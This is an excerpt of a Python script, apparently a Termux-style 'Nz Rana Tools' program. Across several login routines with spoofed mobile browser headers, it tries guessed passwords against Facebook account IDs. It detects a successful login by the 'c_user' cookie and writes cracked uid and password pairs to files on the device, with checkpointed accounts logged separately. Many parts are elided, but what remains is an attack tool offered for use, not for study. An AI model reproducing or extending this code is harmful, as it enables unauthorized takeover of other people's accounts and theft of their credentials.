...
oks = []
cps = []
os.system('espeak -a 300 " Welcome,   to,  Nz,  Rana,  Tools"')
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				uid = coki[151:166]
				print('\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
				print('\33[1;92m[🪶NZ-OK🪽] '+uid+' | '+ps+'|'+Joined(uid)+'\r\033[1;35m')
				if 'y' in NZ_xd:
					...
					break
				open('/sdcard/NZ-OK.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				uid = coki[151:166]
				if 'y' in baby:
					print('\33[1;91m[NZ-CP] '+uid+' | '+ps+'\33[0;97m')
					open('/sdcard/NZ-CP.txt', 'a').write(uid+' | '+ps+'\n')
					cps.append(uid)
					break
				else:
					open('/sdcard/NZ-CP.txt', 'a').write(uid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M1-NZ🪽] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M2-NZ🪽] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'viewport-width': '980',} 
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M3-NZ🪽] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M4-NZ🪽] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M5-NZ🪽] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M6-NZ🪽] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
